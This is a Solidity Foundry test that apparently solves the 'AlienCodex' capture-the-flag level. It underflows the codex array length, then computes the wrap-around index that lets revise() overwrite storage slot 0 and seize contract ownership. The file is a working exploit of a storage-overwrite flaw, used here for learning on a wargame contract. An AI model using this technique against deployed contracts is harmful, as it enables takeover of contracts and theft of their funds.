// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {AlienCodex} from "src/level20.sol";

contract ExploitTest is Test {
    AlienCodex alien;
    address attacker = address(0xBEEF);

    function setUp() public {
        alien = new AlienCodex();
        vm.prank(attacker);
        alien.makeContact();
        alien.retract(); // Now using assembly-based underflow
    }

    function testExploit() public {
        // Log storage for debugging
        bytes32 slot0 = vm.load(address(alien), bytes32(uint256(0)));
        console.log("Slot 0:");
        console.logBytes32(slot0);

        bytes32 slot2 = vm.load(address(alien), bytes32(uint256(2)));
        console.log("Slot 2 (codex length):");
        console.logBytes32(slot2);

        bytes32 codexStartSlot = keccak256(abi.encode(uint256(2)));
        bytes32 slotAtCodex0 = vm.load(address(alien), codexStartSlot);
        console.log("keccak256(2) (codex[0]):");
        console.logBytes32(slotAtCodex0);

        vm.startPrank(attacker);

        // Compute index to overwrite slot 0 (owner)
        uint256 index = type(uint256).max -
            uint256(keccak256(abi.encode(uint256(2)))) +
            1;

        // Overwrite owner: using no bit-shift because owner occupies the lower 20 bytes.
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        alien.revise(index, newOwner);
        // alien.revise(index, bytes32(uint256(uint160(address(this)))));

        // Check if the attacker is now the owner.
        assertEq(alien.owner(), attacker);

        vm.stopPrank();
    }
}
